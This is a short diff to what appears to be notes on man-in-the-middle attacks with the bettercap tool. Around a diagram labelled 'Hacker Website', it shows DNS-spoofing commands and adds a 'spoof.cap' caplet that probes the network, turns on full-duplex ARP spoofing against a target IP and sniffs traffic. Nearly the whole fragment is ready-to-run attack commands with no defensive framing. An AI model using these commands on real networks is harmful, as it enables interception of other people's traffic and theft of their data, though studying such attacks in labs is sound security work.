@@ -127,7 +127,14 @@ Client <-69.69.69.1- Man In the Middle ---------- Google | Hacker Website
 > set dns.spoof.domains [domains_sperated_by_comma]
 > dns.spoof on
 
+spoof.cap
+---------
 
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets [ip_address]
+arp.spoof on
+net.sniff on
 
 
 
